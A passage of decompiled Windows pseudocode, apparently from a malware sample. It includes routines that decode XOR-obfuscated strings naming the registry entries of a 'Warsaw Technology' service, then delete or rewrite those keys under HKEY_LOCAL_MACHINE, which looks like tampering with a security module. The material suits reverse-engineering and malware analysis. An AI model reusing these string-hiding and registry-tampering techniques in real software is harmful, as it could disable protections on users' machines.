     + ((signed __int64)((unsigned __int128)((signed __int64)(a1[2] - *a1) * (signed __int128)341606371735362067i64) >> 64) >> 2);
  if ( 85401592933840516i64 - (v3 >> 1) >= v3 )
  {
    v6 = (v3 >> 1) + v3;
    if ( v6 < v2 )
      v6 = v2;
    result = v6;
  }
  else
  {
    v4 = 0i64;
    if ( v2 > 0 )
      v4 = v2;
    result = v4;
  }
  return result;
}

//----- (00000001400148A0) ----------------------------------------------------
signed __int64 __fastcall sub_1400148A0(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  __int64 *v3; // rdi
  _OWORD *v4; // rbx
  unsigned __int64 v5; // r14
  signed __int64 result; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x12F684BDA12F684i64 || (v4 = operator new(216 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  sub_140014520(*v3, v3[1], v4);
  v5 = ((unsigned __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)341606371735362067i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)341606371735362067i64) >> 64) >> 2);
  if ( *v3 )
    operator delete((void *)*v3);
  v3[2] = (__int64)v4 + 216 * v2;
  result = (signed __int64)v4 + 216 * v5;
  v3[1] = result;
  *v3 = (__int64)v4;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140014980) ----------------------------------------------------
__int64 __fastcall sub_140014980(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r9
  __int64 *v3; // rbx
  __int64 v4; // rcx
  signed __int128 v5; // ax
  unsigned __int64 v6; // rdx
  unsigned __int64 v7; // rax

  v2 = a2;
  v3 = a1;
  v4 = a1[1];
  v5 = (v3[2] - v4) * (signed __int128)341606371735362067i64;
  if ( (*((_QWORD *)&v5 + 1) >> 63) + (*((_QWORD *)&v5 + 1) >> 2) < v2 )
  {
    v6 = ((unsigned __int64)((unsigned __int128)((v4 - *v3) * (signed __int128)341606371735362067i64) >> 64) >> 63)
       + ((signed __int64)((unsigned __int128)((v4 - *v3) * (signed __int128)341606371735362067i64) >> 64) >> 2);
    if ( 85401592933840516i64 - v6 < v2 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v7 = sub_140014840(v3, v2 + v6);
    *(_QWORD *)&v5 = sub_1400148A0(v3, v7);
  }
  return v5;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140014A20) ----------------------------------------------------
void __fastcall sub_140014A20(__int64 *a1, __int128 *a2)
{
  __int64 *v2; // rbx
  unsigned __int64 v3; // rcx
  __int128 *v4; // rdi
  unsigned __int64 v5; // rdi
  unsigned __int64 v6; // rdi
  __int64 v7; // rcx
  __int128 *v8; // rax
  __int128 v9; // xmm0
  signed __int64 v10; // rcx
  signed __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rcx
  __int128 v14; // xmm0
  signed __int64 v15; // rdi

  v2 = a1;
  v3 = a1[1];
  v4 = a2;
  if ( (unsigned __int64)a2 >= v3 || *v2 > (unsigned __int64)a2 )
  {
    if ( v3 == v2[2] )
      sub_140014980(v2, 1ui64);
    v13 = v2[1];
    if ( v13 )
    {
      v14 = *v4;
      v10 = v13 + 128;
      v15 = (signed __int64)(v4 + 8);
      *(_OWORD *)(v10 - 128) = v14;
      *(_OWORD *)(v10 - 112) = *(_OWORD *)(v15 - 112);
      *(_OWORD *)(v10 - 96) = *(_OWORD *)(v15 - 96);
      *(_OWORD *)(v10 - 80) = *(_OWORD *)(v15 - 80);
      *(_OWORD *)(v10 - 64) = *(_OWORD *)(v15 - 64);
      *(_OWORD *)(v10 - 48) = *(_OWORD *)(v15 - 48);
      *(_OWORD *)(v10 - 32) = *(_OWORD *)(v15 - 32);
      *(_OWORD *)(v10 - 16) = *(_OWORD *)(v15 - 16);
      *(_OWORD *)v10 = *(_OWORD *)v15;
      *(_OWORD *)(v10 + 16) = *(_OWORD *)(v15 + 16);
      *(_OWORD *)(v10 + 32) = *(_OWORD *)(v15 + 32);
      *(_OWORD *)(v10 + 48) = *(_OWORD *)(v15 + 48);
      *(_OWORD *)(v10 + 64) = *(_OWORD *)(v15 + 64);
      v12 = *(_QWORD *)(v15 + 80);
      goto LABEL_11;
    }
  }
  else
  {
    v5 = (signed __int64)((unsigned __int128)(((signed __int64)a2 - *v2) * (signed __int128)341606371735362067i64) >> 64) >> 2;
    v6 = (v5 >> 63) + v5;
    if ( v3 == v2[2] )
      sub_140014980(v2, 1ui64);
    v7 = v2[1];
    v8 = (__int128 *)(*v2 + 216 * v6);
    if ( v7 )
    {
      v9 = *v8;
      v10 = v7 + 128;
      v11 = (signed __int64)(v8 + 8);
      *(_OWORD *)(v10 - 128) = v9;
      *(_OWORD *)(v10 - 112) = *(_OWORD *)(v11 - 112);
      *(_OWORD *)(v10 - 96) = *(_OWORD *)(v11 - 96);
      *(_OWORD *)(v10 - 80) = *(_OWORD *)(v11 - 80);
      *(_OWORD *)(v10 - 64) = *(_OWORD *)(v11 - 64);
      *(_OWORD *)(v10 - 48) = *(_OWORD *)(v11 - 48);
      *(_OWORD *)(v10 - 32) = *(_OWORD *)(v11 - 32);
      *(_OWORD *)(v10 - 16) = *(_OWORD *)(v11 - 16);
      *(_OWORD *)v10 = *(_OWORD *)v11;
      *(_OWORD *)(v10 + 16) = *(_OWORD *)(v11 + 16);
      *(_OWORD *)(v10 + 32) = *(_OWORD *)(v11 + 32);
      *(_OWORD *)(v10 + 48) = *(_OWORD *)(v11 + 48);
      *(_OWORD *)(v10 + 64) = *(_OWORD *)(v11 + 64);
      v12 = *(_QWORD *)(v11 + 80);
LABEL_11:
      *(_QWORD *)(v10 + 80) = v12;
      goto LABEL_12;
    }
  }
LABEL_12:
  v2[1] += 216i64;
}

//----- (0000000140014BB0) ----------------------------------------------------
void **__fastcall sub_140014BB0(void *Src)
{
  int v1; // er9
  unsigned int v2; // edi
  void **v3; // rbx
  int v4; // esi
  char v5; // si
  void *v6; // rcx
  bool v7; // cf
  void **v8; // rax
  __int64 v9; // rdx
  void **v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9CE4;
  v2 = 0;
  v3 = (void **)Src;
  if ( dword_1400D9CE4 & 1 )
  {
    v5 = byte_1400D9CE0;
  }
  else
  {
    v4 = 69069 * dword_1400D9CD8 + 1234567;
    v1 = dword_1400D9CE4 | 1;
    dword_1400D9CD8 = v4;
    dword_1400D9CE4 |= 1u;
    dword_1400D9CD0 = HIWORD(dword_1400D9CD0) + 36969 * (unsigned __int16)dword_1400D9CD0;
    LOBYTE(v4) = (BYTE2(dword_1400D9CDC) + 80 * dword_1400D9CDC) ^ v4;
    dword_1400D9CDC = HIWORD(dword_1400D9CDC) + 18000 * (unsigned __int16)dword_1400D9CDC;
    v5 = (((unsigned int)dword_1400D9CD4 >> 13) ^ 32 * dword_1400D9CD4 ^ dword_1400D9CD4) + v4;
    dword_1400D9CD4 ^= ((unsigned int)dword_1400D9CD4 >> 13) ^ 32 * (dword_1400D9CD4 ^ (dword_1400D9CD4 << 12));
    byte_1400D9CE0 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9CE4 = v1 | 2;
    byte_1400D9CF0[0] = v5 ^ 0x53;
    byte_1400D9CF1 = (v5 - 1) ^ 0x79;
    byte_1400D9CF2 = (v5 - 2) ^ 0x73;
    byte_1400D9CF3 = (v5 - 3) ^ 0x74;
    byte_1400D9CF4 = (v5 - 4) ^ 0x65;
    byte_1400D9CF5 = (v5 - 5) ^ 0x6D;
    byte_1400D9CF6 = (v5 - 6) ^ 0x5C;
    byte_1400D9CF7 = (v5 - 7) ^ 0x43;
    byte_1400D9CF8 = (v5 - 8) ^ 0x75;
    byte_1400D9CF9 = (v5 - 9) ^ 0x72;
    byte_1400D9CFA = (v5 - 10) ^ 0x72;
    byte_1400D9CFB = (v5 - 11) ^ 0x65;
    byte_1400D9CFC = (v5 - 12) ^ 0x6E;
    byte_1400D9CFD = (v5 - 13) ^ 0x74;
    byte_1400D9CFE = (v5 - 14) ^ 0x43;
    byte_1400D9CFF = (v5 - 15) ^ 0x6F;
    byte_1400D9D00 = (v5 - 16) ^ 0x6E;
    byte_1400D9D01 = (v5 - 17) ^ 0x74;
    byte_1400D9D02 = (v5 - 18) ^ 0x72;
    byte_1400D9D03 = (v5 - 19) ^ 0x6F;
    byte_1400D9D04 = (v5 - 20) ^ 0x6C;
    byte_1400D9D05 = (v5 - 21) ^ 0x53;
    byte_1400D9D06 = (v5 - 22) ^ 0x65;
    byte_1400D9D07 = (v5 - 23) ^ 0x74;
    byte_1400D9D08 = (v5 - 24) ^ 0x5C;
    byte_1400D9D09 = (v5 - 25) ^ 0x48;
    byte_1400D9D0A = (v5 - 26) ^ 0x61;
    byte_1400D9D0B = (v5 - 27) ^ 0x72;
    byte_1400D9D0C = (v5 - 28) ^ 0x64;
    byte_1400D9D0D = (v5 - 29) ^ 0x77;
    byte_1400D9D0E = (v5 - 30) ^ 0x61;
    byte_1400D9D0F = (v5 - 31) ^ 0x72;
    byte_1400D9D10 = (v5 - 32) ^ 0x65;
    byte_1400D9D11 = (v5 - 33) ^ 0x20;
    byte_1400D9D12 = (v5 - 34) ^ 0x50;
    byte_1400D9D13 = (v5 - 35) ^ 0x72;
    byte_1400D9D14 = (v5 - 36) ^ 0x6F;
    byte_1400D9D15 = (v5 - 37) ^ 0x66;
    byte_1400D9D16 = (v5 - 38) ^ 0x69;
    byte_1400D9D17 = (v5 - 39) ^ 0x6C;
    byte_1400D9D18 = (v5 - 40) ^ 0x65;
    byte_1400D9D19 = (v5 - 41) ^ 0x73;
    byte_1400D9D1A = (v5 - 42) ^ 0x5C;
    byte_1400D9D1B = (v5 - 43) ^ 0x30;
    byte_1400D9D1C = (v5 - 44) ^ 0x30;
    byte_1400D9D1D = (v5 - 45) ^ 0x30;
    byte_1400D9D1E = (v5 - 46) ^ 0x31;
    byte_1400D9D1F = (v5 - 47) ^ 0x5C;
    byte_1400D9D20 = (v5 - 48) ^ 0x53;
    byte_1400D9D21 = (v5 - 49) ^ 0x79;
    byte_1400D9D22 = (v5 - 50) ^ 0x73;
    byte_1400D9D23 = (v5 - 51) ^ 0x74;
    byte_1400D9D24 = (v5 - 52) ^ 0x65;
    byte_1400D9D25 = (v5 - 53) ^ 0x6D;
    byte_1400D9D26 = (v5 - 54) ^ 0x5C;
    byte_1400D9D27 = (v5 - 55) ^ 0x43;
    byte_1400D9D28 = (v5 - 56) ^ 0x75;
    byte_1400D9D29 = (v5 - 57) ^ 0x72;
    byte_1400D9D2A = (v5 - 58) ^ 0x72;
    byte_1400D9D2B = (v5 - 59) ^ 0x65;
    byte_1400D9D2C = (v5 - 60) ^ 0x6E;
    byte_1400D9D2D = (v5 - 61) ^ 0x74;
    byte_1400D9D2E = (v5 - 62) ^ 0x43;
    byte_1400D9D2F = (v5 - 63) ^ 0x6F;
    byte_1400D9D30 = (v5 - 64) ^ 0x6E;
    byte_1400D9D31 = (v5 - 65) ^ 0x74;
    byte_1400D9D32 = (v5 - 66) ^ 0x72;
    byte_1400D9D33 = (v5 - 67) ^ 0x6F;
    byte_1400D9D34 = (v5 - 68) ^ 0x6C;
    byte_1400D9D35 = (v5 - 69) ^ 0x53;
    byte_1400D9D36 = (v5 - 70) ^ 0x65;
    byte_1400D9D37 = (v5 - 71) ^ 0x74;
    byte_1400D9D38 = (v5 - 72) ^ 0x5C;
    byte_1400D9D39 = (v5 - 73) ^ 0x45;
    byte_1400D9D3A = (v5 - 74) ^ 0x6E;
    byte_1400D9D3B = (v5 - 75) ^ 0x75;
    byte_1400D9D3C = (v5 - 76) ^ 0x6D;
    byte_1400D9D3D = (v5 - 77) ^ 0x5C;
    byte_1400D9D3E = (v5 - 78) ^ 0x52;
    byte_1400D9D3F = (v5 - 79) ^ 0x4F;
    byte_1400D9D40 = (v5 - 80) ^ 0x4F;
    byte_1400D9D41 = (v5 - 81) ^ 0x54;
    byte_1400D9D42 = (v5 - 82) ^ 0x5C;
    byte_1400D9D43 = (v5 - 83) ^ 0x4C;
    byte_1400D9D44 = (v5 - 84) ^ 0x45;
    byte_1400D9D45 = (v5 - 85) ^ 0x47;
    byte_1400D9D46 = (v5 - 86) ^ 0x41;
    byte_1400D9D47 = (v5 - 87) ^ 0x43;
    byte_1400D9D48 = (v5 - 88) ^ 0x59;
    byte_1400D9D49 = (v5 - 89) ^ 0x5F;
    byte_1400D9D4A = (v5 - 90) ^ 0x57;
    byte_1400D9D4B = (v5 - 91) ^ 0x41;
    byte_1400D9D4C = (v5 - 92) ^ 0x52;
    byte_1400D9D4D = (v5 - 93) ^ 0x53;
    byte_1400D9D4E = (v5 - 94) ^ 0x41;
    byte_1400D9D4F = (v5 - 95) ^ 0x57;
    byte_1400D9D50 = (v5 - 96) ^ 0x5F;
    byte_1400D9D51 = (v5 - 97) ^ 0x54;
    byte_1400D9D52 = (v5 - 98) ^ 0x45;
    byte_1400D9D53 = (v5 - 99) ^ 0x43;
    byte_1400D9D54 = (v5 - 100) ^ 0x48;
    byte_1400D9D55 = (v5 - 101) ^ 0x4E;
    byte_1400D9D56 = (v5 - 102) ^ 0x4F;
    byte_1400D9D57 = (v5 - 103) ^ 0x4C;
    byte_1400D9D58 = (v5 - 104) ^ 0x4F;
    byte_1400D9D59 = (v5 - 105) ^ 0x47;
    byte_1400D9D5A = (v5 - 106) ^ 0x59;
    byte_1400D9D5B = (v5 - 107) ^ 0x5C;
    byte_1400D9D5C = (v5 - 108) ^ 0x30;
    byte_1400D9D5D = (v5 - 109) ^ 0x30;
    byte_1400D9D5E = (v5 - 110) ^ 0x30;
    byte_1400D9D5F = (v5 - 111) ^ 0x30;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x70ui64 )
  {
    sub_140004790(Src, 0x70ui64, 0i64);
    v5 = byte_1400D9CE0;
  }
  if ( (unsigned __int64)v3[3] < 0x10 )
    v6 = v3;
  else
    v6 = *v3;
  memset(v6, 0, 0x70ui64);
  v7 = (unsigned __int64)v3[3] < 0x10;
  v3[2] = (void *)112;
  if ( v7 )
    v8 = v3;
  else
    v8 = (void **)*v3;
  *((_BYTE *)v8 + 112) = 0;
  v9 = 0i64;
  do
  {
    if ( (unsigned __int64)v3[3] < 0x10 )
      v10 = v3;
    else
      v10 = (void **)*v3;
    v11 = byte_1400D9CF0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x70 );
  return v3;
}
// 1400D9CD0: using guessed type int dword_1400D9CD0;
// 1400D9CD4: using guessed type int dword_1400D9CD4;
// 1400D9CD8: using guessed type int dword_1400D9CD8;
// 1400D9CDC: using guessed type int dword_1400D9CDC;
// 1400D9CE0: using guessed type char byte_1400D9CE0;
// 1400D9CE4: using guessed type int dword_1400D9CE4;
// 1400D9CF1: using guessed type char byte_1400D9CF1;
// 1400D9CF2: using guessed type char byte_1400D9CF2;
// 1400D9CF3: using guessed type char byte_1400D9CF3;
// 1400D9CF4: using guessed type char byte_1400D9CF4;
// 1400D9CF5: using guessed type char byte_1400D9CF5;
// 1400D9CF6: using guessed type char byte_1400D9CF6;
// 1400D9CF7: using guessed type char byte_1400D9CF7;
// 1400D9CF8: using guessed type char byte_1400D9CF8;
// 1400D9CF9: using guessed type char byte_1400D9CF9;
// 1400D9CFA: using guessed type char byte_1400D9CFA;
// 1400D9CFB: using guessed type char byte_1400D9CFB;
// 1400D9CFC: using guessed type char byte_1400D9CFC;
// 1400D9CFD: using guessed type char byte_1400D9CFD;
// 1400D9CFE: using guessed type char byte_1400D9CFE;
// 1400D9CFF: using guessed type char byte_1400D9CFF;
// 1400D9D00: using guessed type char byte_1400D9D00;
// 1400D9D01: using guessed type char byte_1400D9D01;
// 1400D9D02: using guessed type char byte_1400D9D02;
// 1400D9D03: using guessed type char byte_1400D9D03;
// 1400D9D04: using guessed type char byte_1400D9D04;
// 1400D9D05: using guessed type char byte_1400D9D05;
// 1400D9D06: using guessed type char byte_1400D9D06;
// 1400D9D07: using guessed type char byte_1400D9D07;
// 1400D9D08: using guessed type char byte_1400D9D08;
// 1400D9D09: using guessed type char byte_1400D9D09;
// 1400D9D0A: using guessed type char byte_1400D9D0A;
// 1400D9D0B: using guessed type char byte_1400D9D0B;
// 1400D9D0C: using guessed type char byte_1400D9D0C;
// 1400D9D0D: using guessed type char byte_1400D9D0D;
// 1400D9D0E: using guessed type char byte_1400D9D0E;
// 1400D9D0F: using guessed type char byte_1400D9D0F;
// 1400D9D10: using guessed type char byte_1400D9D10;
// 1400D9D11: using guessed type char byte_1400D9D11;
// 1400D9D12: using guessed type char byte_1400D9D12;
// 1400D9D13: using guessed type char byte_1400D9D13;
// 1400D9D14: using guessed type char byte_1400D9D14;
// 1400D9D15: using guessed type char byte_1400D9D15;
// 1400D9D16: using guessed type char byte_1400D9D16;
// 1400D9D17: using guessed type char byte_1400D9D17;
// 1400D9D18: using guessed type char byte_1400D9D18;
// 1400D9D19: using guessed type char byte_1400D9D19;
// 1400D9D1A: using guessed type char byte_1400D9D1A;
// 1400D9D1B: using guessed type char byte_1400D9D1B;
// 1400D9D1C: using guessed type char byte_1400D9D1C;
// 1400D9D1D: using guessed type char byte_1400D9D1D;
// 1400D9D1E: using guessed type char byte_1400D9D1E;
// 1400D9D1F: using guessed type char byte_1400D9D1F;
// 1400D9D20: using guessed type char byte_1400D9D20;
// 1400D9D21: using guessed type char byte_1400D9D21;
// 1400D9D22: using guessed type char byte_1400D9D22;
// 1400D9D23: using guessed type char byte_1400D9D23;
// 1400D9D24: using guessed type char byte_1400D9D24;
// 1400D9D25: using guessed type char byte_1400D9D25;
// 1400D9D26: using guessed type char byte_1400D9D26;
// 1400D9D27: using guessed type char byte_1400D9D27;
// 1400D9D28: using guessed type char byte_1400D9D28;
// 1400D9D29: using guessed type char byte_1400D9D29;
// 1400D9D2A: using guessed type char byte_1400D9D2A;
// 1400D9D2B: using guessed type char byte_1400D9D2B;
// 1400D9D2C: using guessed type char byte_1400D9D2C;
// 1400D9D2D: using guessed type char byte_1400D9D2D;
// 1400D9D2E: using guessed type char byte_1400D9D2E;
// 1400D9D2F: using guessed type char byte_1400D9D2F;
// 1400D9D30: using guessed type char byte_1400D9D30;
// 1400D9D31: using guessed type char byte_1400D9D31;
// 1400D9D32: using guessed type char byte_1400D9D32;
// 1400D9D33: using guessed type char byte_1400D9D33;
// 1400D9D34: using guessed type char byte_1400D9D34;
// 1400D9D35: using guessed type char byte_1400D9D35;
// 1400D9D36: using guessed type char byte_1400D9D36;
// 1400D9D37: using guessed type char byte_1400D9D37;
// 1400D9D38: using guessed type char byte_1400D9D38;
// 1400D9D39: using guessed type char byte_1400D9D39;
// 1400D9D3A: using guessed type char byte_1400D9D3A;
// 1400D9D3B: using guessed type char byte_1400D9D3B;
// 1400D9D3C: using guessed type char byte_1400D9D3C;
// 1400D9D3D: using guessed type char byte_1400D9D3D;
// 1400D9D3E: using guessed type char byte_1400D9D3E;
// 1400D9D3F: using guessed type char byte_1400D9D3F;
// 1400D9D40: using guessed type char byte_1400D9D40;
// 1400D9D41: using guessed type char byte_1400D9D41;
// 1400D9D42: using guessed type char byte_1400D9D42;
// 1400D9D43: using guessed type char byte_1400D9D43;
// 1400D9D44: using guessed type char byte_1400D9D44;
// 1400D9D45: using guessed type char byte_1400D9D45;
// 1400D9D46: using guessed type char byte_1400D9D46;
// 1400D9D47: using guessed type char byte_1400D9D47;
// 1400D9D48: using guessed type char byte_1400D9D48;
// 1400D9D49: using guessed type char byte_1400D9D49;
// 1400D9D4A: using guessed type char byte_1400D9D4A;
// 1400D9D4B: using guessed type char byte_1400D9D4B;
// 1400D9D4C: using guessed type char byte_1400D9D4C;
// 1400D9D4D: using guessed type char byte_1400D9D4D;
// 1400D9D4E: using guessed type char byte_1400D9D4E;
// 1400D9D4F: using guessed type char byte_1400D9D4F;
// 1400D9D50: using guessed type char byte_1400D9D50;
// 1400D9D51: using guessed type char byte_1400D9D51;
// 1400D9D52: using guessed type char byte_1400D9D52;
// 1400D9D53: using guessed type char byte_1400D9D53;
// 1400D9D54: using guessed type char byte_1400D9D54;
// 1400D9D55: using guessed type char byte_1400D9D55;
// 1400D9D56: using guessed type char byte_1400D9D56;
// 1400D9D57: using guessed type char byte_1400D9D57;
// 1400D9D58: using guessed type char byte_1400D9D58;
// 1400D9D59: using guessed type char byte_1400D9D59;
// 1400D9D5A: using guessed type char byte_1400D9D5A;
// 1400D9D5B: using guessed type char byte_1400D9D5B;
// 1400D9D5C: using guessed type char byte_1400D9D5C;
// 1400D9D5D: using guessed type char byte_1400D9D5D;
// 1400D9D5E: using guessed type char byte_1400D9D5E;
// 1400D9D5F: using guessed type char byte_1400D9D5F;

//----- (0000000140015200) ----------------------------------------------------
bool sub_140015200()
{
  int v0; // eax
  struct _OSVERSIONINFOW VersionInformation; // [rsp+20h] [rbp-138h]

  if ( !(dword_1400D9D64 & 1) )
  {
    dword_1400D9D60 = 2;
    dword_1400D9D64 |= 1u;
LABEL_4:
    VersionInformation.dwOSVersionInfoSize = 276;
    GetVersionExW(&VersionInformation);
    v0 = VersionInformation.dwMajorVersion < 6;
    dword_1400D9D60 = VersionInformation.dwMajorVersion < 6;
    return v0 == 1;
  }
  v0 = dword_1400D9D60;
  if ( dword_1400D9D60 == 2 )
    goto LABEL_4;
  return v0 == 1;
}
// 1400D9D60: using guessed type int dword_1400D9D60;
// 1400D9D64: using guessed type int dword_1400D9D64;

//----- (0000000140015290) ----------------------------------------------------
char __fastcall sub_140015290(char a1)
{
  char v1; // di
  void **v2; // rax
  bool v3; // bl
  void **v4; // rax
  void **v5; // rax
  void *Src; // [rsp+28h] [rbp-50h]
  __int64 v8; // [rsp+38h] [rbp-40h]
  unsigned __int64 v9; // [rsp+40h] [rbp-38h]
  void *Dst; // [rsp+48h] [rbp-30h]
  __int64 v11; // [rsp+58h] [rbp-20h]
  unsigned __int64 v12; // [rsp+60h] [rbp-18h]

  v1 = a1;
  v2 = sub_140014BB0(&Src);
  v3 = sub_14001DE10(HKEY_LOCAL_MACHINE, (const CHAR *)v2, 0) == 0;
  if ( v9 >= 0x10 )
    operator delete(Src);
  if ( v3 )
  {
    v4 = sub_140014BB0(&Src);
    sub_14001DCE0(HKEY_LOCAL_MACHINE, (const CHAR *)v4, 0);
    if ( v9 >= 0x10 )
      operator delete(Src);
  }
  v12 = 15i64;
  v11 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  v5 = sub_140014BB0(&Src);
  sub_14002BA10(HKEY_LOCAL_MACHINE, v5, &Dst, v1);
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  if ( v12 >= 0x10 )
    operator delete(Dst);
  return 1;
}

//----- (00000001400153D0) ----------------------------------------------------
_QWORD *__fastcall sub_1400153D0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9D80;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9D80 & 1 )
  {
    v5 = byte_1400D9D7C;
  }
  else
  {
    v4 = 69069 * dword_1400D9D74 + 1234567;
    v1 = dword_1400D9D80 | 1;
    dword_1400D9D74 = v4;
    dword_1400D9D80 |= 1u;
    dword_1400D9D6C = HIWORD(dword_1400D9D6C) + 36969 * (unsigned __int16)dword_1400D9D6C;
    LOBYTE(v4) = (BYTE2(dword_1400D9D78) + 80 * dword_1400D9D78) ^ v4;
    dword_1400D9D78 = HIWORD(dword_1400D9D78) + 18000 * (unsigned __int16)dword_1400D9D78;
    v5 = (((unsigned int)dword_1400D9D70 >> 13) ^ 32 * dword_1400D9D70 ^ dword_1400D9D70) + v4;
    dword_1400D9D70 ^= ((unsigned int)dword_1400D9D70 >> 13) ^ 32 * (dword_1400D9D70 ^ (dword_1400D9D70 << 12));
    byte_1400D9D7C = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9D80 = v1 | 2;
    byte_1400D9D88[0] = v5 ^ 0x53;
    byte_1400D9D89 = (v5 - 1) ^ 0x79;
    byte_1400D9D8A = (v5 - 2) ^ 0x73;
    byte_1400D9D8B = (v5 - 3) ^ 0x74;
    byte_1400D9D8C = (v5 - 4) ^ 0x65;
    byte_1400D9D8D = (v5 - 5) ^ 0x6D;
    byte_1400D9D8E = (v5 - 6) ^ 0x5C;
    byte_1400D9D8F = (v5 - 7) ^ 0x43;
    byte_1400D9D90 = (v5 - 8) ^ 0x75;
    byte_1400D9D91 = (v5 - 9) ^ 0x72;
    byte_1400D9D92 = (v5 - 10) ^ 0x72;
    byte_1400D9D93 = (v5 - 11) ^ 0x65;
    byte_1400D9D94 = (v5 - 12) ^ 0x6E;
    byte_1400D9D95 = (v5 - 13) ^ 0x74;
    byte_1400D9D96 = (v5 - 14) ^ 0x43;
    byte_1400D9D97 = (v5 - 15) ^ 0x6F;
    byte_1400D9D98 = (v5 - 16) ^ 0x6E;
    byte_1400D9D99 = (v5 - 17) ^ 0x74;
    byte_1400D9D9A = (v5 - 18) ^ 0x72;
    byte_1400D9D9B = (v5 - 19) ^ 0x6F;
    byte_1400D9D9C = (v5 - 20) ^ 0x6C;
    byte_1400D9D9D = (v5 - 21) ^ 0x53;
    byte_1400D9D9E = (v5 - 22) ^ 0x65;
    byte_1400D9D9F = (v5 - 23) ^ 0x74;
    byte_1400D9DA0 = (v5 - 24) ^ 0x5C;
    byte_1400D9DA1 = (v5 - 25) ^ 0x73;
    byte_1400D9DA2 = (v5 - 26) ^ 0x65;
    byte_1400D9DA3 = (v5 - 27) ^ 0x72;
    byte_1400D9DA4 = (v5 - 28) ^ 0x76;
    byte_1400D9DA5 = (v5 - 29) ^ 0x69;
    byte_1400D9DA6 = (v5 - 30) ^ 0x63;
    byte_1400D9DA7 = (v5 - 31) ^ 0x65;
    byte_1400D9DA8 = (v5 - 32) ^ 0x73;
    byte_1400D9DA9 = (v5 - 33) ^ 0x5C;
    byte_1400D9DAA = (v5 - 34) ^ 0x57;
    byte_1400D9DAB = (v5 - 35) ^ 0x61;
    byte_1400D9DAC = (v5 - 36) ^ 0x72;
    byte_1400D9DAD = (v5 - 37) ^ 0x73;
    byte_1400D9DAE = (v5 - 38) ^ 0x61;
    byte_1400D9DAF = (v5 - 39) ^ 0x77;
    byte_1400D9DB0 = (v5 - 40) ^ 0x20;
    byte_1400D9DB1 = (v5 - 41) ^ 0x54;
    byte_1400D9DB2 = (v5 - 42) ^ 0x65;
    byte_1400D9DB3 = (v5 - 43) ^ 0x63;
    byte_1400D9DB4 = (v5 - 44) ^ 0x68;
    byte_1400D9DB5 = (v5 - 45) ^ 0x6E;
    byte_1400D9DB6 = (v5 - 46) ^ 0x6F;
    byte_1400D9DB7 = (v5 - 47) ^ 0x6C;
    byte_1400D9DB8 = (v5 - 48) ^ 0x6F;
    byte_1400D9DB9 = (v5 - 49) ^ 0x67;
    byte_1400D9DBA = (v5 - 50) ^ 0x79;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x33ui64 )
  {
    sub_140004790(Src, 0x33ui64, 0i64);
    v5 = byte_1400D9D7C;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  v6[3] = 0i64;
  v6[4] = 0i64;
  v6[5] = 0i64;
  *((_WORD *)v6 + 24) = 0;
  *((_BYTE *)v6 + 50) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 51i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 51) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9D88[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x33 );
  return v3;
}
// 1400D9D6C: using guessed type int dword_1400D9D6C;
// 1400D9D70: using guessed type int dword_1400D9D70;
// 1400D9D74: using guessed type int dword_1400D9D74;
// 1400D9D78: using guessed type int dword_1400D9D78;
// 1400D9D7C: using guessed type char byte_1400D9D7C;
// 1400D9D80: using guessed type int dword_1400D9D80;
// 1400D9D89: using guessed type char byte_1400D9D89;
// 1400D9D8A: using guessed type char byte_1400D9D8A;
// 1400D9D8B: using guessed type char byte_1400D9D8B;
// 1400D9D8C: using guessed type char byte_1400D9D8C;
// 1400D9D8D: using guessed type char byte_1400D9D8D;
// 1400D9D8E: using guessed type char byte_1400D9D8E;
// 1400D9D8F: using guessed type char byte_1400D9D8F;
// 1400D9D90: using guessed type char byte_1400D9D90;
// 1400D9D91: using guessed type char byte_1400D9D91;
// 1400D9D92: using guessed type char byte_1400D9D92;
// 1400D9D93: using guessed type char byte_1400D9D93;
// 1400D9D94: using guessed type char byte_1400D9D94;
// 1400D9D95: using guessed type char byte_1400D9D95;
// 1400D9D96: using guessed type char byte_1400D9D96;
// 1400D9D97: using guessed type char byte_1400D9D97;
